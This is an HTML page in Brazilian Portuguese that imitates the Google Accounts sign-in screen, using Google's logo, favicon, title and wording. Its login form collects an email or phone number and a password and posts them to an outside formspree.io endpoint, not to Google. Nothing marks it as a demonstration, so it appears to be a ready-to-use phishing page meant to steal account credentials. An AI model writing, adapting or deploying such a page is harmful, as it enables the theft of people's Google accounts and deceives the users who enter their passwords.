<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Fazer login – Contas Google</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
  <link rel="icon" href="https://ssl.gstatic.com/accounts/ui/favicon_2x.png">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Roboto', sans-serif;
    }

    body {
      background-color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      width: 100%;
      max-width: 400px;
      padding: 40px 30px;
      border: 1px solid #dadce0;
      border-radius: 8px;
      box-shadow: 0 1px 2px rgba(0,0,0,0.1);
    }

    .logo {
      display: block;
      margin: 0 auto 24px;
      width: 75px;
    }

    h1 {
      font-size: 24px;
      font-weight: 400;
      color: #202124;
      margin-bottom: 10px;
    }

    p.sub {
      font-size: 16px;
      color: #5f6368;
      margin-bottom: 30px;
    }

    input {
      width: 100%;
      padding: 12px;
      font-size: 16px;
      border: 1px solid #dadce0;
      border-radius: 4px;
      margin-bottom: 20px;
    }

    button {
      width: 100%;
      padding: 10px;
      font-size: 16px;
      background-color: #1a73e8;
      color: white;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }

    button:hover {
      background-color: #155ab6;
    }

    .footer-text {
      margin-top: 20px;
      font-size: 12px;
      color: #5f6368;
      text-align: center;
    }

    @media (max-width: 500px) {
      .container {
        margin: 0 15px;
        padding: 30px 20px;
      }
    }
  </style>
</head>
<body>

  <div class="container">
    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo" alt="Google">
    <h1>Fazer login</h1>
    <p class="sub">Use sua Conta do Google</p>

    <form action="https://formspree.io/f/xwplaaqz" method="POST">
      <input type="email" name="email" placeholder="E-mail ou telefone" required>
      <input type="password" name="senha" placeholder="Digite sua senha" required>
      <button type="submit">Próxima</button>
    </form>

    <p class="footer-text">Não está no seu computador? Use uma janela anônima para fazer login.</p>
  </div>

</body>
</html>
